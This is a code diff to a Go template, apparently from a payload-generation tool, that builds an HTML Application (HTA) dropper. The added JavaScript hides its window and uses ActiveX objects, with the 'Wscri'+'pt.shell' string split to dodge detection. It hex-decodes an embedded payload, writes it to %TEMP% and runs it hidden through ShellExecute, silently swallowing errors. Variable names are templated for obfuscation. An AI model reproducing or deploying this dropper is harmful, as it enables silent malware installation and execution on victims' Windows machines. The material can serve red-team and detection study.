@@ -78,7 +78,70 @@ func HTA() string {
 	<BODY>
 	<script language="javascript" >
 	window.resizeTo(0,0);
-	{{.Variables.payload}}
+	try {
+		var {{.Variables.RNZyt}} = window.document.location.pathname;
+		var {{.Variables.fos}} = new ActiveXObject("Scripting.FileSystemObject");
+		var {{.Variables.bogusWindows1252Chars}} = "\u20AC\u201A\u0192\u201E\u2026\u2020\u2021\u02C6\u2030\u0160\u2039\u0152\u017D\u2018\u2019\u201C\u201D\u2022\u2013\u2014\u02DC\u2122\u0161\u203A\u0153\u017E\u0178";
+		var {{.Variables.correctLatin1Chars}} = "\u0080\u0082\u0083\u0084\u0085\u0086\u0087\u0088\u0089\u008A\u008B\u008C\u008E\u0091\u0092\u0093\u0094\u0095\u0096\u0097\u0098\u0099\u009A\u009B\u009C\u009E\u009F";
+		var {{.Variables.obshell}} = new ActiveXObject("Shell.Application");
+		var {{.Variables.pathworks}} = new ActiveXObject("Wscri"+"pt.shell");
+		var {{.Variables.dest}} = {{.Variables.pathworks}}.ExpandEnvironmentStrings("%TEMP%") + "\\{{.Variables.filename}}";
+	 
+		function binaryString(str)
+		{
+			var r = str ? new String(str) : new String();
+			r.byteAt = function(index)
+			{
+				var value = this.charCodeAt(index);
+				if (value > 0xff)
+				{
+					var p = {{.Variables.bogusWindows1252Chars}}.indexOf(this.charAt(index));
+					value = {{.Variables.correctLatin1Chars}}.charCodeAt(p);
+				}
+				var hex = value.toString(16);
+				return (hex.length == 2) ? hex : "0" + hex;
+			};
+			return r;
+		}
+		function {{.Variables.fromByte}}(hex)
+		{
+			var c = String.fromCharCode(parseInt(hex, 16));
+			var p = {{.Variables.correctLatin1Chars}}.indexOf(c);
+			return (p == -1) ? c : {{.Variables.bogusWindows1252Chars}}.charAt(p);
+		}
+		function {{.Variables.decode}}()
+		{
+			var {{.Variables.chunkSize}} = 8192;
+			var {{.Variables.source}} = "{{.Variables.payload}}";
+			var {{.Variables.decodedFile}} = {{.Variables.fos}}.OpenTextFile({{.Variables.dest}}, 2, true); 
+			var {{.Variables.hexString}} = {{.Variables.source}};
+				var tempArray = new Array();
+				for (var i = 0; i < {{.Variables.hexString}}.length; i += 2)
+				{
+					tempArray[i >> 1] = {{.Variables.fromByte}}({{.Variables.hexString}}.substring(i, i + 2));
+				}
+				var s = tempArray.join("");
+				if (s.length > 0)
+				{
+					{{.Variables.decodedFile}}.Write(s);
+				}
+			{{.Variables.decodedFile}}.Close();
+		}
+	
+		function {{.Variables.sleep}}(milliseconds) {
+		  var start = new Date().getTime();
+		  for (var i = 0; i < 1e7; i++) {
+			if ((new Date().getTime() - start) > milliseconds){
+			  break;
+			}
+		  }
+		}
+		
+		{{.Variables.decode}}();
+		{{.Variables.obshell}}.ShellExecute(""+{{.Variables.dest}}+"","","","",0);
+		}
+		catch (err){
+			}
 	window.close();
 	</script>
 	</BODY>
